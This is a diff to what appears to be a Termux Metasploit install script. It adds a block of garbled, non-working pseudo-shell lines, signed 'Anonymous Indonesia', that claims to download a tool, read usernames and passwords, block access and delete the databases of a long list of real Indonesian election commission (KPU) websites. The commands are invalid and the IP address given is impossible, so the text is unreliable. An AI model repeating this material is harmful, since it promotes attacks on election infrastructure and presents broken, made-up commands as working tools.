@@ -66,3 +66,108 @@ cd ${PREFIX}/bin && curl -LO https://hax4us.github.io/files/msfconsole && chmod 
 ln -sf $(which msfconsole) $PREFIX/bin/msfvenom
 
 echo "you can directly use msfvenom or msfconsole rather than ./msfvenom or ./msfconsole."
+echo "you can use after now rooting down'
+echo "semoga hari mu menyenangkan."
+cd $ (PREFIX)/-r && bash -IO https://github.com/MRXcyber/KPU.GO.ID
+if ! detect device/computer (swich on data base.) run
+ls ! -sf && chmod 777 run kpu.go.id
+cd kpu
+		Run to starting downloading server ./system runing $progress downloading 100%#
+		ls : "user_name"
+		ls : "password:
+		
+		./system reading php api -,silente
+		linux detected true
+		then file fi server research ip "start -run"
+		
+		
+	file 1
+	
+	ip adresss : 122.454.89.00
+	start to kpu.go.id
+	54
+	Data base 2019
+	run toll all delete ALL php.run starting 
+	\<system> start-delete.
+	https://kpu.go.id/
+	http://kip.acehprov.go.id/ 
+	http://kpud-sumutprov.go.id/ 
+	http://sumbar.kpu.go.id 
+	http://riau.kpu.go.id/
+	http://lampung.kpu.go.id 
+	 KPU Provinsi Kep. Babel
+http://kpu-babelprov.go.id/
+KPU Provinsi Kepri
+http://kepri.kpu.go.id/
+KPU DKI Jakarta
+http://kpujakarta.go.id
+KPU Provinsi Jawa Barat
+http://jabar.kpu.go.id/
+KPU Provinsi Jawa Tengah
+http://jateng.kpu.go.id/
+KPU Provinsi Jawa Timur
+http://kpujatim.go.id/
+KPU Provinsi Banten
+http://kpu-bantenprov.go.id/
+KPU Provinsi Bali
+http://bali.kpu.go.id/
+KPU Provinsi NTB
+http://kpud-ntbprov.go.id/
+KPU Provinsi NTT
+http://ntt.kpu.go.id/
+KPU Provinsi Kalbar
+http://kalbar.kpu.go.id
+KPU Provinsi Kalteng
+http://kpu-kaltengprov.go.id/
+KPU Provinsi Kalsel
+http://kalsel.kpu.go.id/
+KPU Provinsi Kaltim
+http://kaltim.kpu.go.id/
+KPU Provinsi Sulawesi Tenggara
+http://sultra.kpu.go.id/
+KPU Provinsi Sulawesi Tengah
+http://sulteng.kpu.go.id/
+KPU Provinsi Sulawesi Selatan
+http://sulsel.kpu.go.id/
+KPU Provinsi Sulawesi Utara
+http://www.kpu-sulutprov.go.id/
+KPU Provinsi Gorontalo
+http://gorontalo.kpu.go.id/
+KPU Provinsi Sulawesi Barat
+http://kpu-sulbarprov.go.id/
+KPU Provinsi Maluku
+http://kpu-malukuprov.go.id/
+KPU Provinsi Maluku Utara
+http://malut.kpu.go.id/
+KPU DIY
+http://diy.kpu.go.id/
+KPU Provinsi Bengkulu
+http://bengkulu.kpu.go.id
+KPU Provinsi Jambi
+http://jambi.kpu.go.id//
+KPU Provinsi Papua Barat
+http://kpu-papuabaratprov.go.id/
+KPU Provinsi Papua
+http://kpu-papuaprov.go.id/
+KPU Provinsi Kalimantan Utara
+http://kaltara.kpu.go.id/ 
+RUN $
+$ cd run kpu blokir accses 
+$ cd run kpu delete data base
+
+			" WE ARE ANONYMOUS INDONESIA SEMOGA HARI MU MENYENANGKAN BAPAK & IBU DISANA KEEP SMILE # MRX "
+			-r rubby install package
+			
+		to get install script 
+		apt update && apt upgrade 
+		apt install nano 
+		apt install nmap 
+		apt install curl 
+		apt install git 
+		apt install python2
+		pip2 install requests
+		git clone https://github.com/Metasploit/MRX.VIP1/kpu
+		cd kpu
+		ls
+		php install requests
+		php kpu.php
